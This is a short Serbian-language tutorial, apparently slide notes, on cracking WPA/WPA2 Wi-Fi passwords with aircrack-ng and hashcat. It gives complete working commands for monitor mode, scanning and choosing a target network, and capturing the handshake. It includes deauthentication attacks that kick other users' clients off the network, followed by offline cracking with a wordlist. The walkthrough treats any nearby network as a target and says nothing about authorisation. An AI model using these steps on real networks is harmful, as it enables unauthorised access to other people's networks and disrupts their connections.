WIFI HACKING
============

razbijanje WPA/WPA2 uz pomoc `aircrack-ng` i `hashcat` alata.
-------------------------------------------------------------

Priprema
========

Potrebno je instalirati programe `aircrack-ng` i `hashcat`. I drajvere
za graficku karticu.

Podesavanje wifi interfejsa
---------------------------

Pronadjemo naziv interfejsa uz pomoc komande\
`ip a`

``` {style="font-size:0.3rem;"}
1: lo:  mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: enp0s25:  mtu 1500 qdisc pfifo_fast state DOWN group default qlen 1000
    link/ether 00:1f:16:37:d8:48 brd ff:ff:ff:ff:ff:ff
3: wls1:  mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:26:c6:8a:00:26 brd ff:ff:ff:ff:ff:ff
    inet 192.168.0.104/24 brd 192.168.0.255 scope global dynamic noprefixroute wls1
       valid_lft 6532sec preferred_lft 6532sec
    inet6 fe80::8afa:e05b:896c:83f5/64 scope link noprefixroute 
       valid_lft forever preferred_lft forever
        
```

Zapamtimo ime wifi interfejsa, u ovom slucaju *wls1* posle aktiviranja
**monitor mode**-a ime ce postati *wls1mon*, to koristimo u komandama
umesto \<ifacemon\>, kod vas ime moze biti drugacije.

Monitor mode
============

Komandom\
`airmon-ng start <iface>`\
ubacujemo mreznu karticu u **monitor mode**. Monitor mode nam daje
potpunu kontrolu nad mreznom karticom. I on nam omogucava da uzmemo **handshake** koji nam je
potreban za dalje.

Nalazenje mreze
===============

Komandom\
`airodump-ng <ifacemon>` posmatramo koje se mreze nalaze oko nas.
Videcemo tabelu i odatle su nam bitna sledeca polja:

-   **CH**, kanal, ovo je bitan podatak za dalji rad
-   **BSSID**, MAC adresa mreze
-   **ENC**, zastita, trazimo WPA/WPA2
-   **PWR**, snaga signala, sto veci broj to bolje
-   **AUTH**, mod autentifikacije, trazimo **PSK**

Hvatanje handshake-a
====================

Kada odredimo koju mrezu napadamo krecemo da slusamo za **handshake**
komandom\
`airodump-ng -c <kanal> --bssid <BSSID> -w handshake <ifacemon>` Da
bismo snimili handshake potrebno je da se neko poveze na mrezu, dakle
cekamo dok se to ne desi. Kada je handshake uhvacen to ce pisati u
gornjem desnom uglu. Tada mozemo da prekinemo slusanje. Ispod tabele za
mrezama nalazi se tabela sa klijentima, za aktivno skidanje klijenta nam
je potrebna MAC adresa pa je korisno to zapisati.

Hvatanje handshake-a
====================

Ukoliko nam se ne ceka, mozemo nekoga skinuti sa mreze i cekati da se
opet poveze. Pre svega ostavimo `airodump-ng` da slusa, ista komanda kao
na prethodnoj strani. I onda skinemo sve klijente sa mreze komandom:\
`aireplay-ng -0 10 -a <BSSID> <ifacemon>` Ukoliko ne uspe iz prve,
probamo opet. Mozemo i skinuti pojedinacnog klijenta sledecom komandom
`aireplay-ng -0 10 -a <BSSID> -c <MAC_KLIJENTA> <ifacemon>`

Priprema handshake-a za hashcat
===============================

Posle uspesno uhvacenog handshake-a u folderu ce se pojaviti par novih
fajlova. Bitan fajl nam je `handshake-01.cap` od njega pravimo fajl koji
`hashcat` moze da procita komandom\
`aircrack-ng -j handshake-01 handshake-01.cap` Sada imamo `handshake-01.hccapx` njega
razbijamo uz pomoc `hashcat`-a komandom\
`hashcat -m 2500 handshake-01.hccapx recnik.txt`

Informacije za dalje
====================

-   `man aircrack-ng`, `man hashcat`
-   `https://www.aircrack-ng.org/doku.php`wiki od aircrack-ng
-   `https://hashcat.net/wiki/`, hashcat wiki
